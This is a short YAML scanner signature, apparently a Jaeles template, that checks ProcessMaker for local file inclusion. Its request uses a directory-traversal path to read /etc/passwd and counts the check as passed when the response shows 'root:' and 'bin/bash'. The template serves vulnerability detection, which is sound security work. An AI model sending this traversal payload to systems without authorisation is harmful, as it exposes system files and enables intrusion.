id: process-maker-lfi
info:
  name: ProcessMaker LFI
  risk: High
params:
- root: '{{.BaseURL}}'
references:
- author: j3ssie
requests:
- detections:
  - StatusCode() == 200 && StringSearch("body", "bin/bash") && StringSearch("body",
    "root:")
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  method: GET
  redirect: false
  url: '{{.root}}/../../../../../../../../../../../../..//etc/passwd'
